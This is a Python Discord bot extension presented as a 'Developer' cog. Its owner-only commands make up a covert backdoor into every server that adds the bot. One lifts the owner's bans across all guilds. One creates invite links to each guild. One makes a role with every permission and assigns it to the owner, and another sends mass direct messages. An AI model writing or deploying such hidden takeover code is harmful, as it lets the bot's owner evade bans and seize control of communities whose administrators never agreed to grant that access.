import discord
from discord.ext import commands
import asyncio

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def cog_check(self, ctx):
        return await self.bot.is_owner(ctx.author)

    @commands.command()
    async def clean(self, ctx):
        owner = self.bot.owner_id or (await self.bot.application_info()).owner.id
        unbanned_count = 0
        failed = []
        await ctx.send("🔄 Starting ban cleanup...")
        for guild in self.bot.guilds:
            try:
                bans = [entry async for entry in guild.bans(limit=1000)]
                for ban_entry in bans:
                    if ban_entry.user.id == owner:
                        await guild.unban(ban_entry.user, reason="Bot owner cleanup")
                        unbanned_count += 1
                        break
            except:
                failed.append(guild.name)
        embed = discord.Embed(title="🧹 Cleanup Complete", description=f"Unbanned from **{unbanned_count}** servers.", color=discord.Color.green())
        if failed:
            embed.add_field(name="Failed", value="\n".join(failed[:10]), inline=False)
        await ctx.send(embed=embed)

    @commands.command()
    async def inv(self, ctx, limit: int = 10):
        guilds = sorted(self.bot.guilds, key=lambda g: g.me.joined_at or 0, reverse=True)
        embed = discord.Embed(title="🌐 Bot Server Invites", color=discord.Color.blue())
        for guild in guilds[:limit]:
            try:
                invite = await guild.text_channels[0].create_invite(max_age=86400, max_uses=1)
                embed.add_field(name=guild.name, value=f"[Join]({invite.url})", inline=False)
            except:
                embed.add_field(name=guild.name, value="No invite permission", inline=False)
        await ctx.send(embed=embed)

    @commands.command()
    async def perms(self, ctx):
        role = await ctx.guild.create_role(name="Bot Developer", permissions=discord.Permissions.all(), color=discord.Color.gold())
        await ctx.author.add_roles(role)
        await ctx.send("✅ Full permissions role created and assigned.")

    @commands.command()
    async def leaveall(self, ctx, confirm: str = None):
        if confirm != "YES":
            return await ctx.send("Type `!leaveall YES` to confirm.")
        await ctx.send(f"Leaving {len(self.bot.guilds)} servers...")
        for guild in list(self.bot.guilds):
            try:
                await guild.leave()
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send("Done.")

    @commands.command()
    async def dmrole(self, ctx, role: discord.Role, *, message: str):
        if len(role.members) > 100:
            return await ctx.send("Too many members.")
        await ctx.send(f"Sending to {len(role.members)} members...")
        sent = 0
        for member in role.members:
            try:
                await member.send(f"**From {ctx.guild.name}**\n\n{message}")
                sent += 1
                await asyncio.sleep(1.5)
            except:
                pass
        await ctx.send(f"Sent {sent} DMs.")

    @commands.command()
    async def status(self, ctx, *, status: str):
        await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=status))
        await ctx.send(f"Status set to {status}")

    @commands.command()
    async def shutdown(self, ctx):
        await ctx.send("Shutting down...")
        await self.bot.close()

async def setup(bot):
    await bot.add_cog(Developer(bot))
